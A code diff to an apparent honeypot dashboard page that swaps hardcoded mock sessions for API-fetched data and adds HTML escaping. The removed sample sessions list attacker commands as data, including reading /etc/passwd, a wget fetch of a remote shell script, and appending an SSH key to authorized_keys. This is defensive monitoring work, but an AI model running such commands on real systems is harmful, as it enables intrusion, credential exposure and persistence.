@@ -90,69 +90,11 @@
   </div>
 
   <script>
-    const sessions = [
-      {
-        id: "sess-1048",
-        timestamp: new Date("2026-06-24T14:12:00"),
-        sourceIp: "185.234.219.x",
-        country: "Russia",
-        persona: "Ubuntu Web Server",
-        protocol: "SSH",
-        actor: "commodity_bot",
-        risk: "high",
-        intent: "Credential Access",
-        duration: "4m 18s",
-        commands: ["whoami", "id", "uname -a", "cat /etc/passwd", "wget http://185.234.219.x/a.sh"],
-        evidence: "The session showed admin-like username attempts, a read of a sensitive file, and an attempted external payload fetch.",
-        analystRecommendation: "Rotate exposed credentials and preserve the session transcript for incident review."
-      },
-      {
-        id: "sess-1047",
-        timestamp: new Date("2026-06-24T13:58:00"),
-        sourceIp: "103.77.166.x",
-        country: "China",
-        persona: "Debian Mail Gateway",
-        protocol: "SSH",
-        actor: "automated_scanner",
-        risk: "medium",
-        intent: "Reconnaissance",
-        duration: "1m 42s",
-        commands: ["pwd", "ls -la", "cat /etc/issue", "netstat -tulpn"],
-        evidence: "The session performed system fingerprinting followed by network service discovery, consistent with reconnaissance behavior."
-      },
-      {
-        id: "sess-1046",
-        timestamp: new Date("2026-06-23T13:41:00"),
-        sourceIp: "198.199.103.x",
-        country: "USA",
-        persona: "Generic Linux Shell",
-        protocol: "SSH",
-        actor: "automated_scanner",
-        risk: "low",
-        intent: "Scanner Validation",
-        duration: "24s",
-        commands: ["echo test", "exit"],
-        evidence: "The session ran a short command sequence and logged out cleanly, consistent with automated scanner validation."
-      },
-      {
-        id: "sess-1045",
-        timestamp: new Date("2026-06-22T12:37:00"),
-        sourceIp: "177.54.144.x",
-        country: "Brazil",
-        persona: "CentOS Database",
-        protocol: "SSH",
-        actor: "skilled_human_operator",
-        risk: "high",
-        intent: "Persistence Setup",
-        duration: "6m 03s",
-        commands: ["whoami", "crontab -l", "mkdir -p ~/.ssh", "echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys"],
-        evidence: "The session touched a persistence path and attempted to insert an SSH key into authorized_keys."
-      }
-    ];
-
-    const NOW = new Date("2026-06-24T23:59:00");
+    let allSessions = [];
+    let visibleSessions = [];
+    let sessionsLoadFailed = false;
+    const eventsCache = new Map();
     const tableBody = document.getElementById("sessionsTableBody");
-    let visibleSessions = sessions;
 
     const ACTOR_LABELS = {
       automated_scanner: "Automated Scanner",
@@ -161,6 +103,57 @@
       script_kiddie: "Script Kiddie",
       skilled_human_operator: "Skilled Human Operator"
     };
+
+    const PROTOCOL_LABELS = {
+      tcp_shell: "SSH",
+      http: "HTTP",
+      ftp: "FTP",
+      telnet: "TELNET"
+    };
+
+    const INTENT_LABELS = {
+      unknown: "Unknown",
+      reconnaissance: "Reconnaissance",
+      credential_theft: "Credential Access",
+      data_access: "Data Access",
+      interactive_operation: "Interactive Operation"
+    };
+
+    const ANALYST_RECOMMENDATION_TEXT = {
+      increase_source_monitoring: "Increase monitoring on this source — discovery activity may precede credential access or exploitation.",
+      preserve_session_transcript: "Preserve this session transcript for analyst review and replay.",
+      review_decoy_exposure: "Review which decoy files were surfaced and whether they need rotation.",
+      rotate_exposed_credentials: "Rotate any credentials this session may have captured or exposed.",
+      escalate_incident_review: "Escalate this session for incident review before any external action."
+    };
+
+    function escHtml(str) {
+      return String(str == null ? "" : str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+    }
+
+    function personaDisplay(personaId) {
+      if (!personaId) return "Unknown persona";
+      return personaId
+        .split(/[_-]/)
+        .map((word) => word.charAt(0).toUpperCase() + word.slice(1))
+        .join(" ");
+    }
+
+    function badgeTier(riskLevel) {
+      if (riskLevel === "critical" || riskLevel === "high") return "high";
+      if (riskLevel === "medium") return "medium";
+      return "low";
+    }
+
+    function formatDuration(startedAt, endedAt) {
+      const totalSeconds = Math.max(0, Math.round((endedAt ?? startedAt) - startedAt));
+      const minutes = Math.floor(totalSeconds / 60);
+      const seconds = totalSeconds % 60;
+      return minutes > 0 ? `${minutes}m ${String(seconds).padStart(2, "0")}s` : `${seconds}s`;
+    }
 
     function formatSessionTime(date) {
       const day = String(date.getDate()).padStart(2, "0");
@@ -180,9 +173,45 @@
       return `${year}-${month}-${day}`;
     }
 
+    async function fetchJSON(url) {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`Request failed for ${url} (${response.status})`);
+      }
+      return response.json();
+    }
+
+    function mapRun(run) {
+      return {
+        id: run.id,
+        sessionId: run.session_id,
+        timestamp: new Date(run.started_at * 1000),
+        endedAt: run.ended_at,
+        startedAt: run.started_at,
+        sourceIp: run.peer_ip || "unknown",
+        country: run.country || "Unknown",
+        persona: personaDisplay(run.persona_id),
+        protocol: PROTOCOL_LABELS[run.protocol] || run.protocol.toUpperCase(),
+        actor: run.actor_label,
+        risk: run.risk_level,
+        intent: INTENT_LABELS[run.intent] || run.intent,
+        duration: formatDuration(run.started_at, run.ended_at),
+        evidence: run.signals
+          .filter((signal) => signal.signal_type === "evidence")
+          .map((signal) => signal.signal_value)
+          .join(" "),
+        analystRecommendationAction: (
+          run.signals.find((signal) => signal.signal_type === "analyst_recommendation") || {}
+        ).signal_key
+      };
+    }
+
     function renderSessions(sessionsToRender) {
       if (sessionsToRender.length === 0) {
-        tableBody.innerHTML = `<tr><td colspan="8" class="empty-state" style="text-align: center;">No sessions in this range.</td></tr>`;
+        const message = sessionsLoadFailed
+          ? "Could not load sessions. Is the database configured?"
+          : "No sessions in this range.";
+        tableBody.innerHTML = `<tr><td colspan="8" class="empty-state" style="text-align: center;">${message}</td></tr>`;
         return;
       }
       tableBody.innerHTML = sessionsToRender.map((session) => `
@@ -193,27 +222,41 @@
               <span>${session.duration}</span>
             </div>
           </td>
-          <td class="mono-cell">${session.sourceIp}</td>
-          <td>${session.country}</td>
+          <td class="mono-cell">${escHtml(session.sourceIp)}</td>
+          <td>${escHtml(session.country)}</td>
           <td>
             <div class="cell-primary">
-              <strong>${session.persona}</strong>
-              <span>${session.id}</span>
+              <strong>${escHtml(session.persona)}</strong>
+              <span>${escHtml(session.sessionId)}</span>
             </div>
           </td>
-          <td>${session.protocol}</td>
+          <td>${escHtml(session.protocol)}</td>
           <td>
             <span class="actor-badge ${session.actor === "skilled_human_operator" ? "human" : "bot"}">
-              ${ACTOR_LABELS[session.actor]}
+              ${escHtml(session.actor ? (ACTOR_LABELS[session.actor] || session.actor) : "Unclassified")}
             </span>
           </td>
-          <td><span class="risk-badge ${session.risk}">${session.risk}</span></td>
-          <td>${session.intent}</td>
+          <td><span class="risk-badge ${badgeTier(session.risk)}">${escHtml(session.risk)}</span></td>
+          <td>${escHtml(session.intent)}</td>
         </tr>
       `).join("");
     }
 
-    function toggleSession(sessionId) {
+    async function loadSessionEvents(sessionId) {
+      if (eventsCache.has(sessionId)) {
+        return eventsCache.get(sessionId);
+      }
+      try {
+        const events = await fetchJSON(`/sessions/${sessionId}/events`);
+        eventsCache.set(sessionId, events);
+        return events;
+      } catch (error) {
+        console.error(error);
+        return [];
+      }
+    }
+
+    async function toggleSession(sessionId) {
       const row = document.querySelector(`[data-session-row="${sessionId}"]`);
       const existingDetail = document.getElementById(`${sessionId}-detail`);
       document.querySelectorAll(".session-detail-row").forEach((detail) => detail.remove());
@@ -226,7 +269,7 @@
         return;
       }
 
-      const session = sessions.find((item) => item.id === sessionId);
+      const session = allSessions.find((item) => item.id === sessionId);
       row.classList.add("selected");
       row.setAttribute("aria-expanded", "true");
       row.insertAdjacentHTML("afterend", `
@@ -235,22 +278,33 @@
             <div class="session-detail">
               <section class="detail-block" aria-label="Session evidence">
                 <h3>Evidence</h3>
-                <p>${session.evidence}</p>
+                <p>${escHtml(session.evidence || "No rule evidence recorded for this session.")}</p>
               </section>
               <section class="detail-block" aria-label="Command timeline">
                 <h3>Command Timeline</h3>
-                <ul class="command-list">
-                  ${session.commands.map((command) => `<li>${command}</li>`).join("")}
+                <ul class="command-list" id="${session.id}-commands">
+                  <li>Loading…</li>
                 </ul>
               </section>
               <section class="detail-block" aria-label="Analyst recommendation">
                 <h3>Analyst Recommendation</h3>
-                <p>${session.analystRecommendation || "Review the evidence and preserve the session transcript."}</p>
+                <p>${escHtml(
+                  ANALYST_RECOMMENDATION_TEXT[session.analystRecommendationAction] ||
+                  "Review the evidence and preserve the session transcript."
+                )}</p>
               </section>
             </div>
           </td>
         </tr>
       `);
+
+      const events = await loadSessionEvents(session.sessionId);
+      const commandList = document.getElementById(`${session.id}-commands`);
+      if (!commandList) return; // row was collapsed again before the fetch resolved
+      const commands = events.filter((event) => event.event_type === "command");
+      commandList.innerHTML = commands.length
+        ? commands.map((event) => `<li>${escHtml(event.event_value)}</li>`).join("")
+        : `<li>No commands were captured in this session.</li>`;
     }
 
     function downloadCsv(filename, rows) {
@@ -293,7 +347,7 @@
           session.country,
           session.persona,
           session.protocol,
-          ACTOR_LABELS[session.actor],
+          session.actor ? (ACTOR_LABELS[session.actor] || session.actor) : "Unclassified",
           session.risk,
           session.intent
         ])
@@ -334,7 +388,7 @@
 
     function applyRange() {
       const { from, to } = readRange();
-      visibleSessions = sessions.filter((session) => session.timestamp >= from && session.timestamp <= to);
+      visibleSessions = allSessions.filter((session) => session.timestamp >= from && session.timestamp <= to);
       renderSessions(visibleSessions);
       document.getElementById("timeRangeButton").textContent = formatRangeLabel(from, to);
     }
@@ -347,10 +401,11 @@
       const timeRangeButton = document.getElementById("timeRangeButton");
       const timeRangePanel = document.getElementById("timeRangePanel");
 
+      const now = new Date();
       populateHourSelect(fromHourSelect, 0);
       populateHourSelect(toHourSelect, 23);
-      toDateInput.value = localDateKey(NOW);
-      const defaultFrom = new Date(NOW);
+      toDateInput.value = localDateKey(now);
+      const defaultFrom = new Date(now);
       defaultFrom.setDate(defaultFrom.getDate() - 6);
       fromDateInput.value = localDateKey(defaultFrom);
 
@@ -389,8 +444,20 @@
       }
     }
 
+    async function loadSessions() {
+      try {
+        const runs = await fetchJSON("/classifier/runs?limit=500&order=desc");
+        allSessions = runs.map(mapRun);
+      } catch (error) {
+        console.error(error);
+        allSessions = [];
+        sessionsLoadFailed = true;
+      }
+      initTimeRangeControl();
+    }
+
     document.getElementById("logoutButton").addEventListener("click", logoutDashboard);
-    initTimeRangeControl();
+    loadSessions();
   </script>
 </body>
 </html>
